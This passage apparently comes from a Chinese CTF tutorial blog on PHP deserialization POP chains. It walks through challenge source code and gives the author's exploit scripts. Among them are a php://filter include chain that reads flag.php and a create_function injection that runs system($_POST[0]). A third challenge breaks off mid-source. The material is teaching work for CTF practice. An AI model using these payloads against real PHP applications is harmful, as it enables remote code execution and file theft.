=&gt; $b)</span><br>                <span class="hljs-variable language_">$this</span>-&gt;gun[<span class="hljs-string">&#x27;gun&#x27;</span>]-&gt;fearless;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Saw&quot;</span>;<br>        &#125;<br>		<span class="hljs-comment">//只是一个普通的方法 因为只有一个下划线  发现根本调用不了直接排除就好了</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_pain</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fearless)&#123;<br>                        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;fearless);<br>                &#125;<br>        &#125;<br>       <span class="hljs-comment">//wakeup使用unserialize的时候自动触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>               <span class="hljs-comment">//正则匹配 把对象视为字符串 触发其toString方法</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|php|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;fearless))&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Does it hurt? That&#x27;s right&quot;</span>;<br>                        <span class="hljs-variable language_">$this</span>-&gt;fearless = <span class="hljs-string">&quot;index3.php&quot;</span>;<br>                &#125;<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Petal</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$seed</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;seed = <span class="hljs-keyword">array</span>();<br>        &#125;<br>        <span class="hljs-comment">//寻找不可访问的属性 寻找箭头</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$sun</span></span>)</span>&#123;<br>                <br>            <span class="hljs-variable">$Nourishment</span> = <span class="hljs-variable language_">$this</span>-&gt;seed;<br>            <span class="hljs-comment">//函数的调用后面有括号  可以把类的对象作为函数调用 触发invoke </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$Nourishment</span>();<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ozo&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ozo&#x27;</span>]);   <span class="hljs-comment">//只有反序列化一定是自动触发的过程</span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$Saw</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>(<span class="hljs-string">&#x27;index3.php&#x27;</span>);<br>        <span class="hljs-variable">$Saw</span>-&gt;<span class="hljs-title function_ invoke__">_pain</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h6 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h6><p>起始位置：先考虑魔术方法，destruct或者wakeup 现在题目中只能去利用wakeup作为起始。</p>
<p>结束位置：利用危险的函数，比如include，highlight_file去进行文件内容的读取</p>
<p>知识点补充：</p>
<ol>
<li>遇到正则匹配不要慌，那正是toString方法自动调用的入口</li>
<li>如果需要触发的魔术方法在一个方法中，那么就new两个对象交互使用</li>
<li>include文件包含读取php文件内容常用模板 文件流伪协议base64 即：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure>

<ol start="4">
<li>private的赋值直接在内部，在外面可能赋值不成功</li>
</ol>
<p>构建exp的顺序是从结尾往起始写的，逆向思维，就是我达成这个目的需要什么事情作为前提就是思考的过程，所以最终<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=serialize&spm=1001.2101.3001.7020">serialize</a>的是exp的最后值</p>
<p>解题过程：</p>
<ol>
<li><p>首先需要找到最后的危险函数，看到了在Vox里面的include。</p>
</li>
<li><p>然后想要使用include就要调用fun这个函数</p>
</li>
<li><p>想要调用fun就要触发__invoke这个魔术方法</p>
</li>
<li><p>作为函数就是添加了一个小括号去触发，发现在Petal类中__get方法具备这个调用函数的功能，所以需要去触发__get这个方法</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__invoke</span>()          <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span><br><span class="hljs-title function_ invoke__">__get</span>() 		    <span class="hljs-comment">//用于从不可访问的属性读取数据   包括属性不可访问和不存在</span><br></code></pre></td></tr></table></figure>

<ol start="5">
<li>因为与访问相关，所以全局搜索-&gt;去找哪里会访问，可以发现在Saw类中的__toString中有一个利用数组特性去访问fearless的过程，这个fearless属于上面的get方法中不存在的属性，为不可访问属性，会触发__get,所以需要去触发__toString这个魔术方法</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__toString</span>() 		    <span class="hljs-comment">//把类当作字符串使用时触发</span><br></code></pre></td></tr></table></figure>

<ol start="6">
<li>这就需要去利用正则表达式，视为字符串的特性去触发这个toString方法，而正则表达式在wakeup魔术方法里面</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__wakeup</span>() 		    <span class="hljs-comment">//使用unserialize时触发</span><br></code></pre></td></tr></table></figure>

<ol start="7">
<li>所以直接在反序列化的时候就会触发这个wakeup魔术方法，到此整个pop链的逻辑全部理清</li>
</ol>
<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a><strong>exp：</strong></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vox</span>;<br><span class="hljs-comment">//headset的赋值在内部直接赋值为php://filter/convert.base64-encode/resource=flag.php</span><br><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Petal</span>;<br><span class="hljs-variable">$p</span> -&gt; seed = <span class="hljs-variable">$v</span>;   <span class="hljs-comment">//把$v这个对象作为函数  触发这个对象的invoke方法</span><br><br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>;<br><span class="hljs-variable">$s</span> -&gt; gun = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gun&quot;</span> =&gt; <span class="hljs-variable">$p</span>);    <span class="hljs-comment">//让$p这个对象去访问fearless 不存在触发这个对象中的get方法</span><br><span class="hljs-variable">$s2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>;<br><span class="hljs-variable">$s2</span> -&gt; fearless = <span class="hljs-variable">$s</span>;       <span class="hljs-comment">//把$s这个对象作为字符串 触发这个对象中的toString方法</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s2</span>));   <span class="hljs-comment">//输出最终结果</span><br></code></pre></td></tr></table></figure>

<h5 id="自己写的exp："><a href="#自己写的exp：" class="headerlink" title="自己写的exp："></a>自己写的exp：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php">index3.php You are in my range!<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vox</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$headset</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sound</span>;<br>    <span class="hljs-comment">//考虑fun函数作为最终的利用点</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params"><span class="hljs-variable">$pulse</span></span>)</span>&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-variable">$pulse</span>);<br>        &#125;<br>    <span class="hljs-comment">//调用invoke魔术方法  对象作为函数时触发 找用小括号的地方</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-comment">//这里可以调用fun函数</span><br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fun</span>(<span class="hljs-variable">$this</span>-&gt;headset);<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Saw</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$fearless</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$gun</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;fearless = <span class="hljs-variable">$file</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fearless . <span class="hljs-string">&#x27; You are in my range!&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>       <span class="hljs-comment">//对象视为字符串触发 定位到正则匹配</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment">//把gun设置为Petal的对象访问fearless 属于不存在属性</span><br>                <span class="hljs-variable language_">$this</span>-&gt;gun[<span class="hljs-string">&#x27;gun&#x27;</span>]-&gt;fearless;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Saw&quot;</span>;<br>        &#125;<br>		<span class="hljs-comment">//只是一个普通的方法 因为只有一个下划线  发现根本调用不了直接排除就好了</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_pain</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fearless)&#123;<br>                        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;fearless);<br>                &#125;<br>        &#125;<br>       <span class="hljs-comment">//wakeup使用unserialize的时候自动触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>               <span class="hljs-comment">//正则匹配 把对象视为字符串 触发其toString方法</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|php|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;fearless))&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Does it hurt? That&#x27;s right&quot;</span>;<br>                        <span class="hljs-variable language_">$this</span>-&gt;fearless = <span class="hljs-string">&quot;index3.php&quot;</span>;<br>                &#125;<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Petal</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$seed</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;seed = <span class="hljs-keyword">array</span>();<br>        &#125;<br>        <span class="hljs-comment">//寻找不可访问的属性 寻找箭头</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$sun</span></span>)</span>&#123;<br>                <br>            <span class="hljs-variable">$Nourishment</span> = <span class="hljs-variable language_">$this</span>-&gt;seed;<br>            <span class="hljs-comment">//函数的调用后面有括号  可以把类的对象作为函数调用 触发invoke </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$Nourishment</span>();<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">// if(isset($_GET[&#x27;ozo&#x27;]))&#123;</span><br><span class="hljs-comment">//         unserialize($_GET[&#x27;ozo&#x27;]);   //只有反序列化一定是自动触发的过程</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// else&#123;</span><br><span class="hljs-comment">//         $Saw = new Saw(&#x27;index3.php&#x27;);</span><br><span class="hljs-comment">//         $Saw-&gt;_pain();</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>();<br><br><span class="hljs-variable">$a2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>();<br><br><span class="hljs-variable">$a</span> -&gt; fearless = <span class="hljs-variable">$a2</span>;<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Petal</span>;<br><span class="hljs-variable">$a2</span> -&gt; gun = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gun&quot;</span> =&gt; <span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vox</span>;<br><span class="hljs-variable">$b</span> -&gt; seed = <span class="hljs-variable">$c</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>输入后成功得到一段base64密文</p>
<p><img src="/.com//17476562901048388660158913969350-20250519200450-p2hilyc.png" srcset="/image/loading.gif" lazyload alt="17476562901048388660158913969350"></p>
<p>解密成功得到flag！</p>
<p>‍</p>
<h2 id="例题3："><a href="#例题3：" class="headerlink" title="例题3："></a>例题3：</h2><p><a target="_blank" rel="noopener" href="http://122.114.252.87:1110/gwb.php">http://122.114.252.87:1110/gwb.php</a></p>
<h6 id="数组特性"><a href="#数组特性" class="headerlink" title="数组特性"></a>数组特性</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i am f() from class A&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$arr</span> = [<span class="hljs-keyword">new</span> A, <span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$arr</span>();<br></code></pre></td></tr></table></figure>

<p>运行结果：<strong>i am f() from class A</strong></p>
<p>表明当一个数组被当做函数触发时，数组第一个元素是对象，第二个元素是方法的名字（字符串），那么就会调用该对象下的该方法。即可以调用任意对象的任意方法</p>
<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$pwd</span>=<span class="hljs-title function_ invoke__">getcwd</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-comment">//起始位置</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;        <br>            <span class="hljs-comment">//后面有括号 函数调用 考虑使用数组的特性</span><br>                <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;key)();<br>                <span class="hljs-variable language_">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;welcome &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;mod1;<br>                  <br>        &#125; <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment">//利用这段代码进行creat_function方法的调用</span><br>            <span class="hljs-variable">$a</span>=<span class="hljs-variable language_">$this</span>-&gt;action;<br>            <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable language_">$this</span>-&gt;code);<br>        &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$pwd</span>=<span class="hljs-title function_ invoke__">getcwd</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;        <br>                <span class="hljs-comment">// unserialize($this-&gt;key)();</span><br>                <span class="hljs-comment">// $this-&gt;mod2 = &quot;welcome &quot;.$this-&gt;mod1;</span><br>                  <br>        &#125; <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;        <br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;return(0);&#125;echo(123);system($_POST[0]);//&#x27;</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;create_function&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment">// $a=$this-&gt;action;</span><br>            <span class="hljs-comment">// $a(&#x27;&#x27;, $this-&gt;code);</span><br>            <span class="hljs-comment">//相当于创建了一个名为a的函数 无参 函数内容如下</span><br>            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">echo</span>(<span class="hljs-number">123</span>);<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-comment">//&#125;</span><br>            <span class="hljs-comment">//提前把函数a进行闭合 然后后面多余的括号注释掉</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">func</span>();<br><span class="hljs-variable">$arr</span> = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>, <span class="hljs-string">&#x27;get_flag&#x27;</span>];<br><span class="hljs-variable">$a</span> -&gt; key = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-comment">// unserialize($_GET[0]);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>传上去之后当我们看到echo的123证明成功执行了这个create_function函数 然后通过system危险函数只需要post参数值就可以进行任意命令执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span>=cat \flag.php<br></code></pre></td></tr></table></figure>

<p><img src="/.com//17476563861268689087422098348706-20250519200627-pcvbx9z.png" srcset="/image/loading.gif" lazyload alt="17476563861268689087422098348706"></p>
<p>成功获取flag 查看一下源代码即可</p>
<p><img src="/.com//17476564501344612018797667358221-20250519200730-fs681v3.png" srcset="/image/loading.gif" lazyload alt="17476564501344612018797667358221"></p>
<p>‍</p>
<h1 id="指针问题："><a href="#指针问题：" class="headerlink" title="指针问题："></a>指针问题：</h1><p>对于一些系统中生成的随机值进行绕过的方法 用C语言中的取地址符&amp;进行指针引用，在序列化的时候类型为R</p>
<h2 id="例题1：BUU-CODE-REVIEW-1-BUUOJ"><a href="#例题1：BUU-CODE-REVIEW-1-BUUOJ" class="headerlink" title="例题1：BUU CODE REVIEW 1 BUUOJ"></a>例题1：BUU CODE REVIEW 1 BUUOJ</h2><h5 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Created by PhpStorm.</span><br><span class="hljs-comment"> * User: jinzhao</span><br><span class="hljs-comment"> * Date: 2019/10/6</span><br><span class="hljs-comment"> * Time: 8:04 PM</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;correct = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">uniqid</span>());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;correct === <span class="hljs-variable language_">$this</span>-&gt;input) &#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pleaseget&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pleasepost&#x27;</span>] === <span class="hljs-string">&#x27;2&#x27;</span>) &#123;<br>        